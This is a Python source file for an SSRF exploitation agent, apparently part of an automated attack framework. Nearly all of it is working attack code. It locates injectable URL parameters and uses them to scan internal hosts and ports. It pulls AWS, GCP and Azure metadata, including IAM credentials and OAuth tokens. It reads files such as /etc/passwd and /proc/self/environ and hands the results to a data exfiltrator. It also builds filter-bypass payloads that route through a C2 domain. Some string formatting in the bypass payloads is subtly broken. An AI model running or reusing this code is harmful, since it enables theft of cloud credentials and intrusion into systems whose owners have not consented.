from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
SSRF (Server-Side Request Forgery) Exploitation Agent
ค้นหาและ exploit SSRF vulnerabilities
"""

import asyncio
import httpx
import os
import re
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse
import logging

log = logging.getLogger(__name__)


class SSRFAgent:
    """SSRF exploitation agent"""
    
    def __init__(self, data_exfiltrator=None):
        self.exfiltrator = data_exfiltrator
        self.timeout = 30.0
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for SSRFAgent
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            result = await self.scan(target)
            
            if isinstance(result, dict):
                return result
            else:
                return {
                    'success': True,
                    'result': result
                }
        
        except Exception as e:
            log.error(f"[SSRFAgent] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    async def scan(self, url: str) -> Dict:
        """
        Scan for SSRF vulnerabilities
        
        Args:
            url: Target URL
        
        Returns:
            Dict with scan results
        """
        
        log.info(f"[SSRF] Scanning {url}")
        
        vulnerabilities = []
        
        # Test basic SSRF
        basic_ssrf = await self._test_basic_ssrf(url)
        if basic_ssrf:
            vulnerabilities.extend(basic_ssrf)
        
        # Test blind SSRF
        blind_ssrf = await self._test_blind_ssrf(url)
        if blind_ssrf:
            vulnerabilities.extend(blind_ssrf)
        
        return {
            'url': url,
            'vulnerabilities': vulnerabilities,
            'count': len(vulnerabilities)
        }
    
    async def exploit(self, url: str, attack_type: str = 'internal_scan') -> Dict:
        """
        Exploit SSRF vulnerability
        
        Args:
            url: Target URL
            attack_type: 'internal_scan', 'cloud_metadata', 'port_scan', 'file_read'
        
        Returns:
            Dict with exploitation results
        """
        
        log.info(f"[SSRF] Exploiting {url} with {attack_type}")
        
        if attack_type == 'internal_scan':
            return await self._exploit_internal_scan(url)
        elif attack_type == 'cloud_metadata':
            return await self._exploit_cloud_metadata(url)
        elif attack_type == 'port_scan':
            return await self._exploit_port_scan(url)
        elif attack_type == 'file_read':
            return await self._exploit_file_read(url)
        else:
            return {
                'success': False,
                'error': f'Unknown attack type: {attack_type}'
            }
    
    async def _test_basic_ssrf(self, url: str) -> List[Dict]:
        """Test for basic SSRF vulnerability"""
        
        vulnerabilities = []
        
        # Test payloads
        test_targets = [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
        ]
        
        # Common parameter names
        param_names = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'target', 'next']
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for param in param_names:
                for target in test_targets:
                    try:
                        # Test GET parameter
                        test_url = f"{url}?{param}={target}"
                        response = await client.get(test_url)
                        
                        # Check for SSRF indicators
                        if self._is_ssrf_response(response):
                            vulnerabilities.append({
                                'type': 'basic_ssrf',
                                'method': 'GET',
                                'parameter': param,
                                'target': target,
                                'confidence': 'high'
                            })
                            break
                        
                        # Test POST parameter
                        response = await client.post(url, data={param: target})
                        
                        if self._is_ssrf_response(response):
                            vulnerabilities.append({
                                'type': 'basic_ssrf',
                                'method': 'POST',
                                'parameter': param,
                                'target': target,
                                'confidence': 'high'
                            })
                            break
                    
                    except Exception as e:
                        log.debug(f"[SSRF] Test error: {e}")
        
        return vulnerabilities
    
    async def _test_blind_ssrf(self, url: str) -> List[Dict]:
        """Test for blind SSRF vulnerability"""
        
        vulnerabilities = []
        
        # Blind SSRF - check timing differences
        # Note: Requires external server for confirmation
        
        param_names = ['url', 'uri', 'path']
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for param in param_names:
                try:
                    # Test with localhost (should be fast)
                    import time
                    
                    start = time.time()
                    test_url = f"{url}?{param}=http://localhost"
                    await client.get(test_url)
                    localhost_time = time.time() - start
                    
                    # Test with non-existent host (should timeout)
                    start = time.time()
                    test_url = f"{url}?{param}=http://192.0.2.1:81"
                    try:
                        await client.get(test_url)
                    except Exception as e:
                        logging.error("Error occurred")
                    timeout_time = time.time() - start
                    
                    # If timing difference is significant, likely SSRF
                    if timeout_time > localhost_time + 5:
                        vulnerabilities.append({
                            'type': 'blind_ssrf',
                            'parameter': param,
                            'confidence': 'medium',
                            'note': 'Based on timing analysis'
                        })
                
                except Exception as e:
                    log.debug(f"[SSRF] Blind test error: {e}")
        
        return vulnerabilities
    
    def _is_ssrf_response(self, response: httpx.Response) -> bool:
        """Check if response indicates SSRF"""
        
        # Check status code
        if response.status_code not in [200, 301, 302]:
            return False
        
        # Check for localhost indicators
        localhost_indicators = [
            'localhost',
            '127.0.0.1',
            'Apache',
            'nginx',
            'IIS',
            'Connection refused',
            'Connection timeout',
        ]
        
        response_text = response.text.lower()
        
        for indicator in localhost_indicators:
            if indicator.lower() in response_text:
                return True
        
        return False
    
    async def _exploit_internal_scan(self, url: str) -> Dict:
        """Scan internal network via SSRF"""
        
        # Internal IP ranges to scan
        internal_ranges = [
            '127.0.0.1',
            '10.0.0.1',
            '172.16.0.1',
            '192.168.0.1',
            '192.168.1.1',
        ]
        
        results = []
        
        # Find vulnerable parameter
        param = await self._find_vulnerable_parameter(url)
        
        if not param:
            return {
                'success': False,
                'error': 'No vulnerable parameter found'
            }
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for ip in internal_ranges:
                try:
                    # Test HTTP
                    target = f"http://{ip}"
                    test_url = f"{url}?{param}={target}"
                    
                    response = await client.get(test_url)
                    
                    if response.status_code == 200:
                        results.append({
                            'ip': ip,
                            'port': 80,
                            'status': 'open',
                            'service': 'http',
                            'response_preview': response.text[:200]
                        })
                        
                        log.info(f"[SSRF] Found accessible host: {ip}")
                
                except Exception as e:
                    log.debug(f"[SSRF] Scan error for {ip}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'internal_scan',
            'hosts_found': len(results),
            'results': results
        }
    
    async def _exploit_cloud_metadata(self, url: str) -> Dict:
        """Access cloud metadata via SSRF"""
        
        # Cloud metadata endpoints
        metadata_endpoints = {
            'aws': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data/',
            ],
            'gcp': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            ],
            'azure': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            ],
            'digitalocean': [
                'http://169.254.169.254/metadata/v1.json',
            ]
        }
        
        results = []
        
        # Find vulnerable parameter
        param = await self._find_vulnerable_parameter(url)
        
        if not param:
            return {
                'success': False,
                'error': 'No vulnerable parameter found'
            }
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for cloud, endpoints in metadata_endpoints.items():
                for endpoint in endpoints:
                    try:
                        # Build SSRF URL
                        test_url = f"{url}?{param}={endpoint}"
                        
                        # Add required headers for GCP
                        headers = {}
                        if cloud == 'gcp':
                            headers['Metadata-Flavor'] = 'Google'
                        
                        response = await client.get(test_url, headers=headers)
                        
                        if response.status_code == 200 and len(response.text) > 0:
                            results.append({
                                'cloud': cloud,
                                'endpoint': endpoint,
                                'data': response.text[:1000]
                            })
                            
                            # Store metadata
                            if self.exfiltrator:
                                self.exfiltrator.store_file(
                                    filename=f"cloud_metadata_{cloud}.txt",
                                    content=response.text.encode(),
                                    source=url
                                )
                            
                            log.info(f"[SSRF] Accessed {cloud} metadata")
                    
                    except Exception as e:
                        log.debug(f"[SSRF] Metadata access error for {endpoint}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'cloud_metadata',
            'metadata_accessed': len(results),
            'results': results
        }
    
    async def _exploit_port_scan(self, url: str) -> Dict:
        """Port scan internal hosts via SSRF"""
        
        # Common ports to scan
        common_ports = [
            21,   # FTP
            22,   # SSH
            23,   # Telnet
            25,   # SMTP
            80,   # HTTP
            443,  # HTTPS
            3306, # MySQL
            5432, # PostgreSQL
            6379, # Redis
            8080, # HTTP Alt
            9200, # Elasticsearch
        ]
        
        target_host = '127.0.0.1'
        results = []
        
        # Find vulnerable parameter
        param = await self._find_vulnerable_parameter(url)
        
        if not param:
            return {
                'success': False,
                'error': 'No vulnerable parameter found'
            }
        
        async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
            for port in common_ports:
                try:
                    target = f"http://{target_host}:{port}"
                    test_url = f"{url}?{param}={target}"
                    
                    import time
                    start = time.time()
                    
                    try:
                        response = await client.get(test_url)
                        elapsed = time.time() - start
                        
                        # Port is open if response is quick
                        if elapsed < 3:
                            results.append({
                                'host': target_host,
                                'port': port,
                                'status': 'open'
                            })
                            
                            log.info(f"[SSRF] Port {port} is open")
                    
                    except Exception as e:
                        # Port is closed/filtered
                        pass
                
                except Exception as e:
                    log.debug(f"[SSRF] Port scan error for {port}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'port_scan',
            'open_ports': len(results),
            'results': results
        }
    
    async def _exploit_file_read(self, url: str) -> Dict:
        """Read local files via SSRF (file:// protocol)"""
        
        # Files to read
        target_files = [
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///proc/self/environ',
            'file:///var/www/html/config.php',
            'file://C:/Windows/System32/drivers/etc/hosts',
        ]
        
        results = []
        
        # Find vulnerable parameter
        param = await self._find_vulnerable_parameter(url)
        
        if not param:
            return {
                'success': False,
                'error': 'No vulnerable parameter found'
            }
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for file_path in target_files:
                try:
                    test_url = f"{url}?{param}={file_path}"
                    
                    response = await client.get(test_url)
                    
                    if response.status_code == 200 and len(response.text) > 0:
                        results.append({
                            'file': file_path,
                            'content': response.text[:1000]
                        })
                        
                        # Store file
                        if self.exfiltrator:
                            self.exfiltrator.store_file(
                                filename=file_path.replace('/', '_').replace(':', '_'),
                                content=response.text.encode(),
                                source=url
                            )
                        
                        log.info(f"[SSRF] Read file: {file_path}")
                
                except Exception as e:
                    log.debug(f"[SSRF] File read error for {file_path}: {e}")
        
        return {
            'success': len(results) > 0,
            'attack_type': 'file_read',
            'files_read': len(results),
            'results': results
        }
    
    async def _find_vulnerable_parameter(self, url: str) -> Optional[str]:
        """Find vulnerable parameter for SSRF"""
        
        param_names = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'target']
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
            for param in param_names:
                try:
                    # Test with localhost
                    test_url = f"{url}?{param}=http://localhost"
                    response = await client.get(test_url)
                    
                    if self._is_ssrf_response(response):
                        return param
                
                except Exception as e:
                    log.debug(f"[SSRF] Parameter test error: {e}")
        
        return None
    
    def generate_bypass_payloads(self, target: str) -> List[str]:
        """
        Generate SSRF bypass payloads
        
        Args:
            target: Target URL/IP
        
        Returns:
            List of bypass payloads
        """
        
        payloads = []
        
        # IP encoding bypasses
        if target == '127.0.0.1':
            payloads.extend([
                'http://127.0.0.1',
                'http://127.1',
                'http://0',
                'http://0.0.0.0',
                'http://[::1]',
                'http://localhost',
                'http://127.0.0.1.nip.io',
                'http://127.0.0.1.xip.io',
                'http://2130706433',  # Decimal
                'http://0x7f000001',  # Hex
                'http://0177.0.0.1',  # Octal
            ])
        
        # URL encoding
        payloads.append(target.replace(':', '%3A').replace('/', '%2F'))
        
        # Double encoding
        payloads.append(target.replace(':', '%253A').replace('/', '%252F'))
        
        # @ bypass
        payloads.append(f'http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '@{target}')
        
        # # bypass
        payloads.append(f'http://{target}#@' + os.getenv('C2_DOMAIN', 'localhost:8000') + '')
        
        # Redirect bypass
        payloads.append(f'http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/redirect?url={target}')
        
        return payloads


# Example usage
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    async def test():
        from core.data_exfiltration import DataExfiltrator
        
        exfiltrator = DataExfiltrator()
        agent = SSRFAgent(exfiltrator)
        
        # Scan for SSRF
        result = await agent.scan("http://target.com/fetch")
        
        print(f"Vulnerabilities found: {result['count']}")
        
        # Exploit - access cloud metadata
        if result['count'] > 0:
            exploit_result = await agent.exploit(
                "http://target.com/fetch",
                attack_type='cloud_metadata'
            )
            print(f"Metadata accessed: {exploit_result['metadata_accessed']}")
    
    asyncio.run(test())

